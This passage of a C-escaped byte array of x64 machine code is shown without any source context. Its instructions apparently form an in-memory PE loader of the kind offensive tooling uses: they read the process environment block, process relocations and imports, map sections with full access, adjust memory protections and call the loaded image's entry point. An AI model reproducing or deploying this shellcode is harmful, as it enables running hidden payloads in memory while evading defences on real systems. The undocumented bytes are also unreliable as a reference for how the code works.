"\xac\x24\x38\xfd\xff\xff\x48\x81\xec\xc8\x03\x00\x00\x48\x8d\xba"
"\x28\x05\x00\x00\x33\xdb\x4c\x63\x7f\x3c\x48\x8b\xf1\x4c\x03\xff"
"\x48\x89\x5c\x24\x70\x33\xc9\x4c\x89\x7c\x24\x68\x4c\x8b\xe2\x48"
"\x89\x9d\x28\x03\x00\x00\x48\x89\x5c\x24\x50\x48\x89\x7d\x80\xff"
"\x56\x40\x48\x8b\xd0\x44\x8d\x4b\x03\x44\x8d\x53\x01\x48\x63\x40"
"\x3c\x0f\xb7\x4c\x10\x04\x66\x41\x39\x4f\x04\x74\x45\x41\xb8\x4c"
"\x01\x00\x00\x66\x45\x39\x47\x04\x75\x38\x41\xb8\x00\x02\x00\x00"
"\x66\x41\x3b\xc8\x75\x2c\x39\x9c\x10\xfc\x00\x00\x00\x0f\x84\xf3"
"\x09\x00\x00\x8b\x8c\x10\xf8\x00\x00\x00\x85\xc9\x0f\x84\xe4\x09"
"\x00\x00\x8b\x4c\x11\x10\x41\x22\xc9\x41\x3a\xca\x0f\x85\xd4\x09"
"\x00\x00\x41\x8b\x47\x50\x48\x89\x45\x90\x41\x8b\x87\xb4\x00\x00"
"\x00\x89\x85\x20\x03\x00\x00\x85\xc0\x75\x0b\x49\x8b\x47\x30\x48"
"\x89\x85\x28\x03\x00\x00\x4c\x8d\xb6\x25\x06\x00\x00\x48\x89\x5c"
"\x24\x30\x41\xbd\x02\x00\x00\x00\x41\x38\x1e\x75\x34\xc7\x44\x24"
"\x28\x00\x00\x00\x08\x4c\x8d\x4d\x90\x45\x33\xc0\xc7\x44\x24\x20"
"\x40\x00\x00\x00\xba\x1f\x00\x0f\x00\x48\x8d\x4c\x24\x60\xff\x96"
"\x10\x02\x00\x00\x85\xc0\x0f\x85\x6a\x09\x00\x00\xe9\x9b\x00\x00"
"\x00\x89\x5c\x24\x28\x45\x8b\xc2\x44\x89\x4c\x24\x20\xba\x00\x00"
"\x00\x80\x45\x33\xc9\x49\x8b\xce\xff\x96\x90\x00\x00\x00\x48\x8b"
"\xf8\x48\xff\xc8\x48\x83\xf8\xfd\x0f\x87\x38\x09\x00\x00\x48\x8d"
"\x54\x24\x58\x48\x89\x5c\x24\x58\x48\x8b\xcf\xff\x96\x98\x00\x00"
"\x00\x85\xc0\x0f\x84\x1d\x09\x00\x00\x8b\x44\x24\x58\x41\x39\x47"
"\x50\x0f\x87\x0f\x09\x00\x00\x48\x89\x7c\x24\x30\x48\x8d\x4c\x24"
"\x60\xc7\x44\x24\x28\x00\x00\x00\x01\x45\x33\xc9\x45\x33\xc0\x44"
"\x89\x6c\x24\x20\xba\x1f\x00\x0f\x00\xff\x96\x10\x02\x00\x00\x48"
"\x8b\xcf\x8b\xd8\xff\x96\xf0\x00\x00\x00\x85\xdb\x0f\x85\xd4\x08"
"\x00\x00\x49\x8d\xbc\x24\x28\x05\x00\x00\x33\xdb\xff\x96\xb0\x00"
"\x00\x00\x48\x8b\x4c\x24\x60\x4c\x8d\x85\x28\x03\x00\x00\xc7\x44"
"\x24\x48\x04\x00\x00\x00\x48\x8b\xd0\x89\x5c\x24\x40\x48\x8d\x44"
"\x24\x50\x44\x89\x6c\x24\x38\x45\x33\xc9\x48\x89\x44\x24\x30\x48"
"\x89\x5c\x24\x28\x48\x89\x5c\x24\x20\xff\x96\x18\x02\x00\x00\x48"
"\x8b\x8d\x28\x03\x00\x00\x4c\x63\x6f\x3c\x4c\x03\xe9\x4c\x89\x6d"
"\x88\x85\xc0\x74\x0b\x3d\x03\x00\x00\x40\x0f\x85\x66\x08\x00\x00"
"\x48\x85\xc9\x0f\x84\x5d\x08\x00\x00\x41\x38\x1e\x74\x5d\x48\x8b"
"\x54\x24\x50\x4c\x8d\x8d\x10\x03\x00\x00\xbb\x04\x00\x00\x00\x44"
"\x8b\xc3\xff\x56\x60\x41\x8b\x57\x54\x44\x8b\xcb\x33\xc9\x41\xb8"
"\x00\x30\x00\x00\xff\x56\x48\x45\x8b\x47\x54\x48\x8b\xc8\x48\x8b"
"\x95\x28\x03\x00\x00\x48\x89\x44\x24\x58\xe8\xf6\x15\x00\x00\x44"
"\x8b\x44\x24\x50\x33\xd2\x48\x8b\x8d\x28\x03\x00\x00\xe8\x03\x16"
"\x00\x00\x48\x8b\x8d\x28\x03\x00\x00\xeb\x0c\x48\x8b\x85\x18\x03"
"\x00\x00\x48\x89\x44\x24\x58\x45\x8b\x47\x54\x48\x8b\xd7\xe8\xc2"
"\x15\x00\x00\x48\x8b\x85\x28\x03\x00\x00\x33\xff\x49\x89\x45\x30"
"\x44\x8b\xf7\x41\x0f\xb7\x45\x14\x48\x83\xc0\x18\x49\x03\xc5\x48"
"\x89\x44\x24\x78\x66\x41\x3b\x7d\x06\x73\x52\x4c\x8b\x7d\x80\x4c"
"\x8b\xe0\x41\x8b\xc6\x48\x8d\x3c\x80\x41\x8b\x5c\xfc\x0c\x48\x03"
"\x9d\x28\x03\x00\x00\x41\x8b\x54\xfc\x14\x48\x8b\xcb\x45\x8b\x44"
"\xfc\x10\x49\x03\xd7\xe8\x6b\x15\x00\x00\x0f\xb6\x03\x41\xff\xc6"
"\x41\x89\x44\xfc\x08\x41\x0f\xb7\x45\x06\x44\x3b\xf0\x72\xc3\x4c"
"\x8b\x7c\x24\x68\x33\xff\x4c\x8b\xa5\x18\x03\x00\x00\x4c\x8b\x85"
"\x28\x03\x00\x00\x8b\x85\x20\x03\x00\x00\x4d\x8b\xd0\x4d\x2b\x57"
"\x30\x85\xc0\x0f\x84\xf0\x00\x00\x00\x4d\x85\xd2\x0f\x84\xe7\x00"
"\x00\x00\x41\x8b\x8d\xb0\x00\x00\x00\x48\x8d\x1c\x01\x4a\x8d\x04"
"\x03\x4e\x8d\x0c\x01\x4c\x3b\xc8\x0f\x83\xcb\x00\x00\x00\x41\xbe"
"\xff\x0f\x00\x00\x41\x39\x79\x04\x0f\x84\xbb\x00\x00\x00\x41\x8b"
"\x41\x04\x4d\x8d\x59\x08\x49\x03\xc1\x4c\x3b\xd8\x0f\x84\x97\x00"
"\x00\x00\xb9\x02\x00\x00\x00\x41\x0f\xb7\x13\x8b\xc2\x41\x23\xc6"
"\x41\x03\x01\x41\x3b\x45\x50\x73\x6d\x41\x8b\x09\x8b\xc2\x49\x23"
"\xc6\x66\xc1\xea\x0c\x49\x03\xc0\x48\x03\xc8\x66\x83\xfa\x0a\x75"
"\x05\x4c\x01\x11\xeb\x36\xb8\x03\x00\x00\x00\x66\x3b\xd0\x75\x05"
"\x41\x8b\xc2\xeb\x24\xb8\x01\x00\x00\x00\x66\x3b\xd0\x75\x0c\x49"
"\x8b\xc2\x48\xc1\xe8\x10\x0f\xb7\xc0\xeb\x0e\xb8\x02\x00\x00\x00"
"\x66\x3b\xd0\x75\x15\x41\x0f\xb7\xc2\x48\x01\x01\x4c\x8b\x85\x28"
"\x03\x00\x00\xb9\x02\x00\x00\x00\xeb\x0c\x66\x85\xd2\x0f\x85\x14"
"\x06\x00\x00\x48\x8b\xc8\x41\x8b\x41\x04\x4c\x03\xd9\x49\x03\xc1"
"\x4c\x3b\xd8\x0f\x85\x6e\xff\xff\xff\x4a\x8d\x04\x03\x4d\x8b\xcb"
"\x4c\x3b\xd8\x0f\x82\x3b\xff\xff\xff\x41\x8b\x85\x90\x00\x00\x00"
"\x85\xc0\x0f\x84\xb2\x00\x00\x00\x49\x8d\x1c\x00\x39\x7b\x0c\x0f"
"\x84\xa5\x00\x00\x00\x4c\x8b\xbd\x18\x03\x00\x00\x8b\x53\x0c\x48"
"\x8b\xce\x49\x03\xd0\xe8\x9b\x0b\x00\x00\x4c\x8b\x85\x28\x03\x00"
"\x00\x4c\x8b\xe8\x8b\x3b\x44\x8b\x63\x10\x49\x03\xf8\x4d\x03\xe0"
"\x33\xc9\x48\x8b\x07\x48\x85\xc0\x74\x58\x79\x08\x44\x8b\xc8\x45"
"\x33\xc0\xeb\x2c\x4e\x8d\x34\x00\x41\x39\x4f\x04\x74\x1b\x49\x8d"
"\x56\x02\x48\x8b\xce\xe8\xff\xef\xff\xff\x33\xc9\x85\xc0\x74\x09"
"\x48\x8b\x86\xe0\x01\x00\x00\xeb\x14\x45\x33\xc9\x4d\x8d\x46\x02"
"\x49\x8b\xd5\x48\x8b\xce\xe8\x22\x0c\x00\x00\x33\xc9\x49\x89\x04"
"\x24\x48\x83\xc7\x08\x4c\x8b\x85\x28\x03\x00\x00\x49\x83\xc4\x08"
"\xeb\xa0\x48\x83\xc3\x14\x33\xff\x39\x7b\x0c\x0f\x85\x6b\xff\xff"
"\xff\x4c\x8b\x7c\x24\x68\x4c\x8b\x6d\x88\x41\x8b\x85\xf0\x00\x00"
"\x00\x85\xc0\x74\x7d\x48\x8d\x78\x04\x49\x03\xf8\x8b\x07\x85\xc0"
"\x74\x6e\x8b\xd0\x48\x8b\xce\x49\x03\xd0\xe8\xe6\x0a\x00\x00\x4c"
"\x8b\x85\x28\x03\x00\x00\x4c\x8b\xe0\x33\xc0\x4d\x85\xe4\x74\x4a"
"\x8b\x5f\x0c\x44\x8b\x77\x08\x49\x03\xd8\x4d\x03\xf0\xeb\x33\x79"
"\x08\x44\x8b\x0b\x4c\x8b\xc0\xeb\x0a\x49\x83\xc0\x02\x44\x8b\xc8"
"\x4c\x03\xc1\x49\x8b\xd4\x48\x8b\xce\xe8\x8f\x0b\x00\x00\x49\x89"
"\x06\x48\x83\xc3\x08\x4c\x8b\x85\x28\x03\x00\x00\x49\x83\xc6\x08"
"\x33\xc0\x48\x8b\x0b\x48\x85\xc9\x75\xc5\x48\x83\xc7\x20\xeb\x8c"
"\x33\xff\x45\x8b\x65\x28\x48\x8d\x4d\xa0\x4d\x03\xe0\xba\x02\x00"
"\x00\x00\x4c\x89\x64\x24\x68\x49\x8b\xc7\x44\x8d\x42\x7e\x0f\x10"
"\x00\x0f\x10\x48\x10\x0f\x11\x01\x0f\x10\x40\x20\x0f\x11\x49\x10"
"\x0f\x10\x48\x30\x0f\x11\x41\x20\x0f\x10\x40\x40\x0f\x11\x49\x30"
"\x0f\x10\x48\x50\x0f\x11\x41\x40\x0f\x10\x40\x60\x0f\x11\x49\x50"
"\x0f\x10\x48\x70\x49\x03\xc0\x0f\x11\x41\x60\x49\x03\xc8\x0f\x11"
"\x49\xf0\x48\x83\xea\x01\x75\xb6\x48\x8b\x00\x41\xb8\x00\x30\x00"
"\x00\x48\x89\x01\x33\xc9\x48\x8b\x45\xa0\x48\xc1\xe8\x30\x44\x8d"
"\x49\x04\x48\x8d\x14\x80\x48\xc1\xe2\x03\xff\x56\x48\x0f\xb7\x5d"
"\xa6\x48\x8b\xc8\x48\x8b\x54\x24\x78\x4c\x8b\xf0\x48\x89\x44\x24"
"\x70\x44\x8d\x04\x9b\x41\xc1\xe0\x03\xe8\x47\x12\x00\x00\xb8\x01"
"\x00\x00\x00\x39\x86\x74\x05\x00\x00\x75\x49\x40\x38\xbe\x25\x06"
"\x00\x00\x75\x23\x45\x8b\x47\x54\x33\xd2\x48\x8b\x8d\x28\x03\x00"
"\x00\xe8\x3f\x12\x00\x00\x45\x8b\x47\x54\x33\xd2\x48\x8b\x4d\x80"
"\xe8\x30\x12\x00\x00\xeb\x1d\x48\x8b\x44\x24\x58\x48\x85\xc0\x74"
"\x13\x45\x8b\x47\x54\x48\x8b\xd0\x48\x8b\x8d\x28\x03\x00\x00\xe8"
"\xf1\x11\x00\x00\x40\x38\xbe\x25\x06\x00\x00\x0f\x85\x80\x00\x00"
"\x00\xff\x96\xb0\x00\x00\x00\x48\x8b\x95\x28\x03\x00\x00\x48\x8b"
"\xc8\xff\x96\x20\x02\x00\x00\x85\xc0\x0f\x85\xe7\x03\x00\x00\x39"
"\xbd\x20\x03\x00\x00\x74\x07\x48\x89\xbd\x28\x03\x00\x00\x48\x89"
"\x7c\x24\x50\xff\x96\xb0\x00\x00\x00\x48\x8b\x4c\x24\x60\x4c\x8d"
"\x85\x28\x03\x00\x00\xc7\x44\x24\x48\x80\x00\x00\x00\x48\x8b\xd0"
"\x89\x7c\x24\x40\x48\x8d\x44\x24\x50\xc7\x44\x24\x38\x02\x00\x00"
"\x00\x45\x33\xc9\x48\x89\x44\x24\x30\x48\x89\x7c\x24\x28\x48\x89"
"\x7c\x24\x20\xff\x96\x18\x02\x00\x00\x85\xc0\x0f\x85\x85\x03\x00"
"\x00\x48\x8b\x54\x24\x50\x4c\x8d\x8d\x10\x03\x00\x00\x48\x8b\x8d"
"\x28\x03\x00\x00\x41\xb8\x08\x00\x00\x00\xff\x56\x60\x45\x33\xc9"
"\x44\x8b\xfb\x85\xdb\x0f\x84\xea\x00\x00\x00\x4c\x8b\x64\x24\x70"
"\x45\x8d\x51\x01\x44\x8b\xeb\x49\x83\xc6\x0c\x8b\x9d\x18\x03\x00"
"\x00\x41\x8b\x56\x18\x44\x8b\xc2\x8b\xca\x41\xc1\xe8\x1e\xc1\xea"
"\x1d\x41\x23\xd2\xc1\xe9\x1f\x85\xd1\x0f\x85\x9d\x00\x00\x00\x41"
"\x85\xd0\x74\x07\xbb\x20\x00\x00\x00\xeb\x49\x44\x8b\xca\x45\x33"
"\xca\x41\x8b\xc1\x23\xc1\x41\x85\xc0\x74\x12\x8a\x86\x25\x06\x00"
"\x00\xf6\xd8\x1b\xdb\x83\xe3\xfc\x83\xc3\x08\xeb\x24\x41\x33\xca"
"\x41\x8b\xc0\x41\x33\xc2\x23\xc1\x85\xc2\x74\x07\xbb\x10\x00\x00"
"\x00\xeb\x0e\x41\x23\xc9\xb8\x02\x00\x00\x00\x41\x85\xc8\x0f\x45"
"\xd8\x45\x33\xc9\x45\x8b\x06\x41\x8d\x45\xff\x4c\x8b\x95\x28\x03"
"\x00\x00\x4d\x03\xd0\x3b\xf8\x73\x11\x8d\x47\x01\x48\x8d\x04\x80"
"\x41\x8b\x54\xc4\x0c\x49\x2b\xd0\xeb\x04\x41\x8b\x56\x04\x44\x89"
"\x8d\x10\x03\x00\x00\x44\x8b\xc3\x4c\x8d\x8d\x10\x03\x00\x00\x49"
"\x8b\xca\xff\x56\x60\x45\x33\xc9\x45\x8d\x51\x01\x41\x03\xfa\x49"
"\x83\xc6\x28\x41\x3b\xff\x0f\x82\x35\xff\xff\xff\x4c\x8b\x64\x24"
"\x68\x4c\x8b\x6d\x88\x8b\x55\xcc\x4c\x8d\x8d\x10\x03\x00\x00\x48"
"\x8b\x8d\x28\x03\x00\x00\x33\xff\x89\xbd\x10\x03\x00\x00\x44\x8d"
"\x47\x02\xff\x56\x60\x41\x8b\x85\xd0\x00\x00\x00\x44\x8d\x7f\x01"
"\x48\x8b\x8d\x28\x03\x00\x00\x85\xc0\x74\x27\x48\x8b\x5c\x08\x18"
"\x48\x85\xdb\x74\x1d\xeb\x13\x45\x33\xc0\x41\x8b\xd7\xff\xd0\x48"
"\x8b\x8d\x28\x03\x00\x00\x48\x8d\x5b\x08\x48\x8b\x03\x48\x85\xc0"
"\x75\xe5\x4c\x8b\xb5\x18\x03\x00\x00\xb8\x03\x00\x00\x00\x41\x39"
"\x06\x0f\x85\xec\x00\x00\x00\x8b\x45\xc8\x45\x33\xc0\x48\x03\xc1"
"\x41\x8b\xd7\xff\xd0\x4d\x8d\xae\x0c\x03\x00\x00\x41\x38\x7d\x00"
"\x0f\x84\x49\x01\x00\x00\x8b\x45\x28\x4c\x8b\x85\x28\x03\x00\x00"
"\x49\x8d\x0c\x00\x85\xc0\x0f\x84\x3a\x01\x00\x00\x8b\x59\x18\x85"
"\xdb\x0f\x84\x2f\x01\x00\x00\x8b\x79\x1c\x44\x8b\x79\x20\x49\x03"
"\xf8\x44\x8b\x71\x24\x4d\x03\xf8\x4d\x03\xf0\x8d\x43\xff\x49\x8b"
"\xd5\x41\x8b\x0c\x87\x8b\xd8\x49\x03\xc8\x44\x8b\xe0\xe8\xaf\x0f"
"\x00\x00\x4c\x8b\x85\x28\x03\x00\x00\x33\xc9\x85\xc0\x74\x09\x85"
"\xdb\x75\xd8\xe9\x08\x01\x00\x00\x43\x0f\xb7\x04\x66\x8b\x1c\x87"
"\x49\x03\xd8\x0f\x84\xf7\x00\x00\x00\x4c\x8b\xb5\x18\x03\x00\x00"
"\x49\x8d\xbe\x0c\x04\x00\x00\x38\x0f\x74\x44\x41\x39\x8e\x0c\x05"
"\x00\x00\x74\x20\x48\x8d\x85\xb0\x00\x00\x00\xc7\x44\x24\x28\x00"
"\x01\x00\x00\x41\x83\xc9\xff\x48\x89\x44\x24\x20\x4c\x8b\xc7\x33"
"\xd2\xff\x56\x70\x33\xd2\x48\x8d\x8d\xb0\x00\x00\x00\x41\x39\x96"
"\x0c\x05\x00\x00\x48\x0f\x44\xcf\xff\xd3\xe9\x80\x00\x00\x00\xff"
"\xd3\xeb\x7c\x4d\x8d\x86\x0c\x04\x00\x00\x41\x38\x38\x74\x2e\x48"
"\x8d\x85\xb0\x00\x00\x00\xc7\x44\x24\x28\x00\x01\x00\x00\x41\x83"
"\xc9\xff\x48\x89\x44\x24\x20\x33\xd2\x33\xc9\xff\x56\x70\x48\x8d"
"\x95\xb0\x00\x00\x00\x48\x8b\xce\xe8\xec\x03\x00\x00\x41\x39\x7e"
"\x04\x74\x2c\x48\x89\x7c\x24\x28\x45\x33\xc9\x4d\x8b\xc4\x89\x7c"
"\x24\x20\x33\xd2\x33\xc9\xff\x96\x88\x00\x00\x00\x48\x85\xc0\x74"
"\x1e\x83\xca\xff\x48\x8b\xc8\xff\x96\x80\x00\x00\x00\xeb\x10\x65"
"\x48\x8b\x0c\x25\x30\x00\x00\x00\x48\x8b\x49\x60\x41\xff\xd4\x4c"
"\x8b\x85\x28\x03\x00\x00\xb8\x03\x00\x00\x00\x39\x86\x30\x02\x00"
"\x00\x75\x0d\x83\xc9\xff\xff\x56\x68\x4c\x8b\x85\x28\x03\x00\x00"
"\x4c\x8b\xa5\x18\x03\x00\x00\x4d\x85\xc0\x74\x53\x0f\xb7\x45\xa6"
"\xbb\x00\xc0\x00\x00\x48\x8b\x4c\x24\x70\x44\x8b\xc3\x48\x8d\x14"
"\x80\x48\xc1\xe2\x03\xff\x56\x50\x48\x8b\x44\x24\x58\x48\x85\xc0"
"\x74\x0c\x8b\x55\xf4\x44\x8b\xc3\x48\x8b\xc8\xff\x56\x50\xff\x96"
"\xb0\x00\x00\x00\x48\x8b\x95\x28\x03\x00\x00\x48\x8b\xc8\xff\x96"
"\x20\x02\x00\x00\x48\x8b\x4c\x24\x60\xff\x96\xf0\x00\x00\x00\x45"
"\x8b\x84\x24\x24\x05\x00\x00\x49\x8d\x8c\x24\x28\x05\x00\x00\x33"
"\xd2\xe8\xff\x0d\x00\x00\x48\x81\xc4\xc8\x03\x00\x00\x41\x5f\x41"
"\x5e\x41\x5d\x41\x5c\x5f\x5e\x5b\x5d\xc3\xcc\xcc\xcc\x48\x89\x5c"
"\x24\x10\x48\x89\x74\x24\x20\x55\x57\x41\x56\x48\x8d\xac\x24\xc0"
"\xfc\xff\xff\x48\x81\xec\x40\x04\x00\x00\x48\x8b\xda\x48\x8b\xf1"
"\x48\x8b\x91\x58\x0d\x00\x00\x41\xb8\x00\x30\x00\x00\x33\xc9\x48"
"\x8d\x14\x55\x02\x00\x00\x00\x44\x8d\x49\x04\xff\x56\x48\x4c\x8b"
"\xf0\x48\x85\xc0\x0f\x84\x94\x02\x00\x00\x8b\x8b\x24\x05\x00\x00"
"\x4c\x8d\x83\x28\x05\x00\x00\x03\xc9\x83\xcb\xff\x89\x4c\x24\x28"
"\x44\x8b\xcb\x33\xc9\x48\x89\x44\x24\x20\x33\xd2\xff\x56\x70\x83"
"\x65\xe8\x00\x48\x8d\x45\x80\x83\x65\xf8\x00\x48\x8d\x55\x08\x48"
"\x89\x45\xe0\x48\x8b\xce\x48\x8d\x05\x74\xdb\xff\xff\x48\x89\x75"
"\x38\x48\x89\x45\x80\x48\x8d\x05\xf9\xd9\xff\xff\x48\x89\x45\x88"
"\x48\x8d\x05\x56\xda\xff\xff\x48\x89\x45\x90\x48\x8d\x05\xd3\xda"
"\xff\xff\x48\x89\x45\x98\x48\x8d\x05\x50\xda\xff\xff\x48\x89\x45"
"\xa0\x48\x8d\x05\x41\xda\xff\xff\x48\x89\x45\xa8\x48\x8d\x05\x36"
"\xda\xff\xff\x48\x89\x45\xb0\x48\x8d\x05\x2b\xda\xff\xff\x48\x89"
"\x45\xb8\x48\x8d\x05\xb8\xda\xff\xff\x48\x89\x45\xc0\x48\x8d\x05"
"\x15\xda\xff\xff\x48\x89\x45\xc8\x48\x8d\x05\x0a\xda\xff\xff\x48"
"\x89\x45\xd0\x48\x8d\x44\x24\x50\x48\x89\x45\xf0\x48\x8d\x05\x92"
"\xd9\xff\xff\x48\x89\x44\x24\x50\x48\x8d\x05\x76\xd9\xff\xff\x48"
"\x89\x44\x24\x58\x48\x8d\x05\xd2\xd9\xff\xff\x48\x89\x44\x24\x60"
"\x48\x8d\x05\x66\xd9\xff\xff\x48\x89\x44\x24\x68\x48\x8d\x05\x5a"
"\xd9\xff\xff\x48\x89\x44\x24\x70\x48\x8d\x45\x40\x48\x89\x45\x08"
"\x48\x89\x75\x00\xe8\xa0\xe5\xff\xff\x33\xd2\x33\xc9\xff\x96\xa8"
"\x01\x00\x00\x85\xc0\x0f\x85\x4c\x01\x00\x00\x48\x8d\x85\x60\x03"
"\x00\x00\x33\xd2\x4c\x8d\x8e\xd0\x08\x00\x00\x48\x89\x44\x24\x20"
"\x48\x8d\x8e\xb0\x08\x00\x00\x44\x8d\x43\x04\xff\x96\xb0\x01\x00"
"\x00\x85\xc0\x0f\x85\x1e\x01\x00\x00\x48\x8b\x8d\x60\x03\x00\x00"
"\x48\x8d\x96\x10\x09\x00\x00\x4c\x8d\x85\x70\x03\x00\x00\x48\x8b"
"\x01\xff\x10\x85\xc0\x0f\x85\xe2\x00\x00\x00\x48\x8b\x8d\x70\x03"
"\x00\x00\x48\x8b\x01\xff\x50\x18\x85\xc0\x0f\x85\xc0\x00\x00\x00"
"\x48\x8b\x8d\x60\x03\x00\x00\x48\x8d\x55\xe0\x48\x89\x4d\x20\x48"
"\x8b\x01\xff\x50\x18\x85\xc0\x0f\x85\xa3\x00\x00\x00\x48\x8d\x85"
"\x30\x01\x00\x00\xc7\x44\x24\x28\x00\x01\x00\x00\x4c\x8d\x86\x11"
"\x06\x00\x00\x48\x89\x44\x24\x20\x44\x8b\xcb\x33\xd2\x33\xc9\xff"
"\x56\x70\x48\x8d\x8d\x30\x01\x00\x00\xff\x96\x30\x01\x00\x00\x48"
"\x8b\x8d\x60\x03\x00\x00\x44\x8d\x43\x03\x48\x8b\xd0\x48\x8b\xf8"
"\x4c\x8b\x09\x41\xff\x51\x40\x48\x8b\xcf\x8b\xd8\xff\x96\x38\x01"
"\x00\x00\x85\xdb\x75\x4a\x48\x83\x64\x24\x48\x00\x45\x33\xc9\x48"
"\x83\x64\x24\x40\x00\x45\x33\xc0\x21\x5c\x24\x38\x49\x8b\xd6\x48"
"\x8b\x8d\x70\x03\x00\x00\x21\x5c\x24\x30\x48\x83\x64\x24\x28\x00"
"\x48\x83\x64\x24\x20\x00\x48\x8b\x01\xff\x50\x28\x85\xc0\x75\x10"
"\x48\x8b\x8d\x60\x03\x00\x00\x8d\x53\x02\x48\x8b\x01\xff\x50\x28"
"\x48\x8b\x8d\x70\x03\x00\x00\x48\x8b\x01\xff\x50\x10\x48\x8b\x8d"
"\x60\x03\x00\x00\x48\x8b\x01\xff\x50\x38\x48\x8b\x8d\x60\x03\x00"
"\x00\x48\x8b\x01\xff\x50\x10\x44\x8b\x86\x58\x0d\x00\x00\x33\xd2"
"\x49\x8b\xce\x46\x8d\x04\x45\x02\x00\x00\x00\xe8\x15\x0b\x00\x00"
"\x33\xd2\x41\xb8\x00\xc0\x00\x00\x49\x8b\xce\xff\x56\x50\x4c\x8d"
"\x9c\x24\x40\x04\x00\x00\x49\x8b\x5b\x28\x49\x8b\x73\x38\x49\x8b"
"\xe3\x41\x5e\x5f\x5d\xc3\xcc\xcc\xcc\x48\x89\x5c\x24\x10\x48\x89"
"\x6c\x24\x18\x48\x89\x74\x24\x20\x57\x41\x54\x41\x55\x41\x56\x41"
"\x57\x48\x81\xec\xb0\x00\x00\x00\x65\x48\x8b\x04\x25\x30\x00\x00"
"\x00\x48\x8b\xf1\x48\x81\xc1\x48\x03\x00\x00\x48\x8b\xea\x4c\x8b"
"\x78\x60\xff\x56\x40\x33\xc9\x4c\x63\x48\x3c\x4c\x03\xc8\x45\x0f"
"\xb7\x51\x14\x41\x0f\xb7\x51\x06\x4d\x03\xd1\x85\xd2\x74\x18\x44"
"\x8b\x86\x40\x03\x00\x00\x48\x8d\x1c\x89\x45\x39\x44\xda\x18\x74"
"\x3b\xff\xc1\x3b\xca\x72\xef\x8b\x9c\x24\xe0\x00\x00\x00\x48\x8b"
"\xbc\x24\xe0\x00\x00\x00\xff\x96\xc0\x00\x00\x00\x33\xd2\x85\xdb"
"\x74\x3a\x4c\x8b\xc7\x49\x8d\x48\x08\x4d\x8b\xf0\x4c\x8b\xc1\x48"
"\x39\x01\x74\x1a\xff\xc2\x3b\xd3\x72\xeb\xeb\x28\x41\x8b\x7c\xda"
"\x24\x41\x8b\x5c\xda\x20\x48\x03\xf8\xc1\xeb\x03\xeb\xc8\x48\x8b"
"\xd5\x49\x8b\xce\xff\x96\xf0\x01\x00\x00\xeb\x08\x4c\x8b\xb4\x24"
"\xe0\x00\x00\x00\xff\x96\xb8\x00\x00\x00\x33\xed\x44\x8d\x4d\x01"
"\x85\xdb\x74\x41\x48\x8d\x4f\x08\x48\x39\x01\x74\x0d\x41\x03\xe9"
"\x48\x83\xc1\x08\x3b\xeb\x72\xf0\xeb\x2b\x45\x8a\xc1\x48\x8d\x4c"
"\x24\x20\x49\x8b\xd6\xff\x96\xd0\x01\x00\x00\x48\x8d\x0c\xef\x41"
"\xb8\x10\x00\x00\x00\x48\x8d\x54\x24\x20\xe8\xb6\x09\x00\x00\x41"
"\xb9\x01\x00\x00\x00\x49\x8b\x47\x18\x48\x8b\x78\x10\xe9\x02\x01"
"\x00\x00\x4c\x8d\xa6\x70\x03\x00\x00\x41\x8a\x0c\x24\x33\xed\x33"
"\xd2\x45\x8b\xf9\x84\xc9\x0f\x84\xe5\x00\x00\x00\x45\x33\xc0\x80"
"\xf9\x3b\x74\x2e\x81\xfa\x80\x00\x00\x00\x73\x26\x33\xc0\x42\x88"
"\x4c\x04\x30\x80\xf9\x77\x41\x0f\x45\xc7\x80\xf9\x70\x44\x8b\xf8"
"\x41\x0f\x44\xe9\x41\x03\xd1\x44\x8b\xc2\x42\x8a\x0c\x22\x84\xc9"
"\x75\xcd\x85\xd2\x0f\x84\xa7\x00\x00\x00\x8d\x4a\x01\xc6\x44\x14"
"\x30\x00\x48\x8b\x57\x30\x4c\x8d\x44\x24\x30\x4c\x03\xe1\x45\x33"
"\xc9\x48\x8b\xce\xe8\xa4\x01\x00\x00\x48\x8b\xd8\x41\xb9\x01\x00"
"\x00\x00\x48\x85\xc0\x74\x82\x45\x85\xff\x74\x38\x85\xed\x74\x14"
"\xff\xd3\x48\x8b\xd8\x41\xb9\x01\x00\x00\x00\x48\x85\xc0\x0f\x84"
"\x65\xff\xff\xff\x48\x8b\x13\x48\x8b\xce\xe8\xba\xe5\xff\xff\x41"
"\xb9\x01\x00\x00\x00\x85\xc0\x0f\x84\x4c\xff\xff\xff\x48\x8b\x44"
"\x24\x28\xeb\x35\x85\xed\x74\x14\xff\xd3\x48\x8b\xd8\x41\xb9\x01"
"\x00\x00\x00\x48\x85\xc0\x0f\x84\x2d\xff\xff\xff\x48\x8b\x13\x48"
"\x8b\xce\xe8\x82\xe5\xff\xff\x41\xb9\x01\x00\x00\x00\x85\xc0\x0f"
"\x84\x14\xff\xff\xff\x49\x8b\x46\x08\x48\x89\x03\xe9\x08\xff\xff"
"\xff\x48\x8b\x3f\x48\x83\x7f\x30\x00\x0f\x85\xf3\xfe\xff\xff\x4c"
"\x8d\x9c\x24\xb0\x00\x00\x00\x41\x8b\xc1\x49\x8b\x5b\x38\x49\x8b"
"\x6b\x40\x49\x8b\x73\x48\x49\x8b\xe3\x41\x5f\x41\x5e\x41\x5d\x41"
"\x5c\x5f\xc3\xcc\xcc\x48\x89\x5c\x24\x08\x48\x89\x74\x24\x10\x57"
"\x48\x83\xec\x60\x41\x83\xca\xff\x45\x33\xc0\x48\x8b\xf1\x44\x38"
"\x02\x74\x19\x41\x83\xf8\x40\x73\x13\x41\x8a\x04\x10\x42\x88\x44"
"\x04\x20\x41\xff\xc0\x41\x80\x3c\x10\x00\x75\xe7\x41\x8d\x40\xfc"
"\x42\xc6\x44\x04\x20\x00\x80\x7c\x04\x20\x2e\x74\x2a\x42\xc6\x44"
"\x04\x20\x2e\x41\xff\xc0\x42\xc6\x44\x04\x20\x64\x41\xff\xc0\x42"
"\xc6\x44\x04\x20\x6c\x41\xff\xc0\x41\x8d\x40\x01\x42\xc6\x44\x04"
"\x20\x6c\xc6\x44\x04\x20\x00\x65\x48\x8b\x04\x25\x30\x00\x00\x00"
"\x48\x8b\x48\x60\x48\x8b\x41\x18\x48\x8b\x78\x10\x48\x8b\x5f\x30"
"\x48\x85\xdb\x74\x39\x48\x63\x43\x3c\x8b\x8c\x18\x88\x00\x00\x00"
"\x33\xc0\x85\xc9\x74\x1b\x8b\x54\x19\x0c\x48\x8d\x4c\x24\x20\x48"
"\x03\xd3\xe8\x1a\x08\x00\x00\x44\x8b\xd0\x33\xc0\x45\x85\xd2\x74"
